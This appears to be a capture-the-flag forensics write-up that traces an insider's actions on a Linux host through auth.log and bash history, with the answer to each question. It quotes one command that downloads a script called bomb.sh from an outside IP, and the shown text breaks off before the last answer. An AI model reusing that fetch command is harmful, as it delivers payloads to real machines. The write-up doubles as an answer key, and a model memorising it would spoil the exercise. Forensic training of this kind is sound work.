# Disgruntled

### Nothing suspicious... So far
- The user installed a package on the machine using elevated privileges. According to the logs, what is the full COMMAND?<br />
The command that worked for me is  `sudo grep -i 'sudo' /var/log/auth.log | grep apt`:<br />

`/usr/bin/apt install dokuwiki`
- What was the present working directory (PWD) when the previous command was run? `/home/cybert`

### Letâ€™s see if you did anything bad
- Which user was created after the package from the previous task was installed?<br />
Found the answer on the same log file:<br />

`it-admin`
- A user was then later given sudo priveleges. When was the sudoers file updated? (Format: Month Day HH:MM:SS)<br />
I used the command `stat /etc/sudoers` but the date found in there wasn't right. I had to look at the hint for this one. The command i used is `sudo grep -i 'sudo' /var/log/auth.log | grep visudo`:<br />
`Dec 28 06:27:34`
- A script file was opened using the "vi" text editor. What is the name of this file?<br />

`bomb.sh`

### Bomb has been planted. But when and where?
- What is the command used that created the file bomb.sh?<br />
The answer can be found from the bash history, in the image above: `curl 10.10.158.38:8080/bomb.sh --output bomb.sh`
- The file was renamed and moved to a different directory. What is the full path of this file now?<br />
The vi text editor can edit and save files to a different location. Check out the history of vi by looking for ".viminfo". <br />
